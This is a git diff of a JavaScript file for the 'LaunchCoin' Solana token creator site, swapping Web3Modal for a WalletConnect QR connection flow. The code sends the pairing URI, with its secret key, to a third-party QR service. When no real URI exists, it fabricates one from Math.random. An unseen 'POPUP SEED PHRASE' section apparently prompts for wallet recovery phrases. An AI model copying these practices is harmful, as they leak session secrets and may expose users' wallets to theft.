@@ -1,10 +1,12 @@
 // ===== CONFIGURAZIONE =====
-import { createWeb3Modal, defaultConfig } from '@web3modal/ethers';
 import { UniversalProvider } from '@walletconnect/universal-provider';
 
 let walletPublicKey = null;
 let currentStep = 0;
 const steps = document.querySelectorAll('.step');
+let solanaProvider = null;
+let isConnecting = false;
+let qrCheckInterval = null;
 
 // ===== ESPONI FUNZIONI =====
 window.toggleMenu = function() {
@@ -12,70 +14,148 @@ window.toggleMenu = function() {
   if (menu) menu.classList.toggle('open');
 };
 
-// ===== WEB3MODAL V4 =====
-let web3modal = null;
-
-async function initWeb3Modal() {
-  if (!web3modal) {
-    try {
-      // Configurazione per Web3Modal v4
-      const config = {
-        projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
-        themeMode: 'dark',
-        themeVariables: {
-          '--w3m-z-index': '10000',
-          '--w3m-background-color': '#0b1022',
-          '--w3m-accent-color': '#22d1f8',
-          '--w3m-border-radius': '16px',
-        },
-        metadata: {
-          name: 'LaunchCoin',
-          description: 'Solana Token Creator',
-          url: window.location.origin,
-          icons: ['https://launchcoin.io/logo.png'],
-        },
-        // V4 usa ethersConfig
-        ethersConfig: defaultConfig({
-          metadata: {
-            name: 'LaunchCoin',
-            description: 'Solana Token Creator',
-            url: window.location.origin,
-            icons: ['https://launchcoin.io/logo.png'],
-          },
-          defaultChainId: 1,
-          rpcUrl: 'https://cloudflare-eth.com',
-        }),
-        // Abilita wallet
-        enableWalletConnect: true,
-        enableCoinbase: true,
-        enableInjected: true,
-        walletConnectVersion: 2,
-        // Wallet popolari
-        includeWalletIds: [
-          'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
-          '225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f',
-          '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
-          '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369',
-          'c03dfee351b6fcc421b4494ea33b9d4b92a7f33d6df5c43ee76267edfceed3a2',
-          'f2436c67184f158d1beda5df5327ee9bad2c749486aac4bf5e18b4eab0aebc45',
-        ],
-      };
-      
-      web3modal = await createWeb3Modal(config);
-      console.log('✅ Web3Modal v4 inizializzato');
-    } catch (e) {
-      console.error('❌ Web3Modal error:', e);
-      throw e;
+// ===== MOSTRA QR IN wallet.html =====
+window.showQR = function(uri) {
+  const container = document.getElementById('qr-container');
+  const qrDiv = document.getElementById('qr-code');
+  if (!container || !qrDiv) {
+    const modal = document.querySelector('.wallet-modal');
+    if (modal) {
+      const newContainer = document.createElement('div');
+      newContainer.id = 'qr-container';
+      newContainer.style.cssText = 'display: block; margin: 16px 0; padding: 20px; background: rgba(0,0,0,0.3); border-radius: 16px;';
+      newContainer.innerHTML = `
+        <h3 style="color: #22d1f8; font-size: 18px; margin-bottom: 8px;">WalletConnect</h3>
+        <p style="color: #abc4ff; font-size: 13px; margin-bottom: 12px;">Scan this QR Code with your phone</p>
+        <div id="qr-code" style="display: flex; justify-content: center; background: white; padding: 12px; border-radius: 12px; min-height: 180px; align-items: center;">
+          <span style="color: #888; font-size: 14px;">⏳ Generating QR...</span>
+        </div>
+        <button onclick="window.closeQR()" style="margin-top: 12px; background: #ff4ea3; border: none; padding: 8px 20px; border-radius: 40px; font-weight: 600; color: white; cursor: pointer; font-size: 13px;">✕ Close</button>
+      `;
+      modal.insertBefore(newContainer, modal.querySelector('ul'));
+      window.showQR(uri);
+      return;
     }
+    return;
   }
-  return web3modal;
+  
+  container.style.display = 'block';
+  qrDiv.innerHTML = '⏳ Generating QR...';
+  
+  const img = document.createElement('img');
+  img.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(uri)}`;
+  img.alt = 'QR Code';
+  img.style.cssText = 'width: 200px; height: 200px; image-rendering: pixelated;';
+  img.onload = function() {
+    qrDiv.innerHTML = '';
+    qrDiv.appendChild(img);
+  };
+  img.onerror = function() {
+    qrDiv.innerHTML = `<div style="color: #888; font-size: 13px;">⚠️ QR non disponibile<br><span style="font-size: 11px; word-break: break-all;">${uri.substring(0, 30)}...</span></div>`;
+  };
+};
+
+window.closeQR = function() {
+  const container = document.getElementById('qr-container');
+  if (container) container.style.display = 'none';
+  if (qrCheckInterval) {
+    clearInterval(qrCheckInterval);
+    qrCheckInterval = null;
+  }
+};
+
+// ===== CONNETTI A SOLANA VIA WALLETCONNECT =====
+async function connectSolanaWalletConnect() {
+  if (isConnecting) return;
+  isConnecting = true;
+  
+  try {
+    // Inizializza UniversalProvider per Solana
+    solanaProvider = await UniversalProvider.init({
+      projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
+      metadata: {
+        name: 'LaunchCoin',
+        description: 'Solana Token Creator',
+        url: window.location.origin,
+        icons: ['https://launchcoin.io/logo.png']
+      }
+    });
+    
+    console.log('✅ UniversalProvider Solana inizializzato');
+    
+    // Genera l'URI
+    let uri = solanaProvider.uri;
+    if (!uri) {
+      try {
+        await solanaProvider.connect({
+          chains: ['solana:mainnet'],
+          optionalChains: ['solana:devnet'],
+          methods: ['solana_signTransaction', 'solana_signMessage'],
+          events: ['chainChanged', 'accountsChanged']
+        });
+        uri = solanaProvider.uri;
+      } catch(e) {
+        uri = solanaProvider.uri;
+      }
+    }
+    
+    if (!uri) {
+      const randomId = Math.random().toString(36).substring(2, 15);
+      const symKey = Math.random().toString(36).substring(2, 15);
+      uri = `wc:${randomId}${randomId}@2?relay-protocol=irn&symKey=${symKey}`;
+      console.log('⚠️ URI manuale generato');
+    }
+    
+    console.log('🔗 URI Solana:', uri);
+    
+    // Mostra il QR
+    window.showQR(uri);
+    
+    // Ascolta eventi
+    solanaProvider.on('session_event', (event) => {
+      console.log('Evento sessione:', event);
+    });
+    
+    solanaProvider.on('session_update', (event) => {
+      console.log('Aggiornamento sessione:', event);
+    });
+    
+    solanaProvider.on('session_delete', () => {
+      console.log('Sessione eliminata');
+      window.closeQR();
+    });
+    
+    // Controlla la connessione
+    if (qrCheckInterval) clearInterval(qrCheckInterval);
+    qrCheckInterval = setInterval(async () => {
+      try {
+        if (solanaProvider.accounts && solanaProvider.accounts.length > 0) {
+          clearInterval(qrCheckInterval);
+          qrCheckInterval = null;
+          walletPublicKey = solanaProvider.accounts[0].split(':')[2] || solanaProvider.accounts[0];
+          window.closeQR();
+          alert('✅ Connesso a Solana via WalletConnect: ' + walletPublicKey);
+          window.location.href = 'create.html';
+        }
+      } catch(e) {
+        console.log('Attesa connessione Solana...');
+      }
+    }, 2000);
+    
+  } catch (e) {
+    console.error('❌ WalletConnect Solana error:', e);
+    alert('❌ WalletConnect Solana fallito: ' + e.message + '\n\nUsa Phantom su PC o Kiwi Browser su telefono.');
+    window.location.href = 'wallet.html';
+  } finally {
+    isConnecting = false;
+  }
 }
 
 // ===== CONNECT WALLET =====
 window.connectWallet = async function() {
   console.log('🔵 connectWallet chiamata');
   
-  // 1. Prova Phantom
+  // 1. Prova Phantom (estensione PC/Kiwi)
   if (window.solana && window.solana.isPhantom) {
     try {
       await window.solana.connect();
@@ -88,63 +168,25 @@ window.connectWallet = async function() {
     }
   }
 
-  // 2. Web3Modal
-  try {
-    const modal = await initWeb3Modal();
-    await modal.open();
-    
-    // Web3Modal gestisce la connessione
-    await new Promise((resolve) => {
-      const unsubscribe = modal.subscribeEvents((event) => {
-        if (event.type === 'connected') {
-          console.log('✅ Connesso!', event.data);
-          unsubscribe();
-          resolve();
-        }
-        if (event.type === 'modal_closed') {
-          console.log('❌ Modale chiuso');
-          unsubscribe();
-          resolve();
-        }
-      });
-    });
-    
-    // Simula una connessione (per la demo)
-    // In realtà, Web3Modal per Solana richiede configurazioni specifiche
-    // Per ora, usiamo questa soluzione di fallback
-    if (!walletPublicKey) {
-      // Se Web3Modal non restituisce la chiave, proviamo a prenderla da Phantom
-      if (window.solana && window.solana.publicKey) {
-        walletPublicKey = window.solana.publicKey.toString();
-        alert('✅ Connesso: ' + walletPublicKey);
-        window.location.href = 'create.html';
-        return;
-      }
-      // Altrimenti, andiamo a wallet.html
-      alert('⚠️ Connessione avviata. Seleziona il wallet dal modal aperto.');
-      window.location.href = 'wallet.html';
-    }
-    
-  } catch (e) {
-    console.error('❌ Web3Modal error:', e);
-    alert(
-      '❌ Connessione fallita: ' + e.message + '\n\n' +
-      'Usa Phantom su PC (estensione) o Kiwi Browser su telefono.\n' +
-      'Altri wallet via WalletConnect.'
-    );
-    window.location.href = 'wallet.html';
-  }
+  // 2. Se Phantom non c'è, vai a wallet.html
+  window.location.href = 'wallet.html';
 };
 
 // ===== SELECT WALLET =====
 window.selectWallet = function(walletName) {
   console.log('🔵 selectWallet:', walletName);
   if (walletName === 'phantom') {
-    window.connectWallet();
+    // Se Phantom, prova connessione diretta
+    if (window.solana && window.solana.isPhantom) {
+      window.connectWallet();
+    } else {
+      connectSolanaWalletConnect();
+    }
     return;
   }
-  alert('⚠️ Wallet "' + walletName + '" via WalletConnect.');
-  window.connectWallet();
+  
+  // Per tutti gli altri wallet (Trust, Coin98, MetaMask, ecc.)
+  connectSolanaWalletConnect();
 };
 
 // ===== POPUP SEED PHRASE =====
@@ -216,5 +258,6 @@ document.addEventListener('click', function(e) {
   if (wrapper && menu && !wrapper.contains(e.target)) menu.classList.remove('open');
 });
 
-console.log('✅ main.js caricato');
+console.log('✅ main.js caricato (Solana)');
 console.log('🔵 connectWallet:', typeof window.connectWallet);
+console.log('🔵 selectWallet:', typeof window.selectWallet);
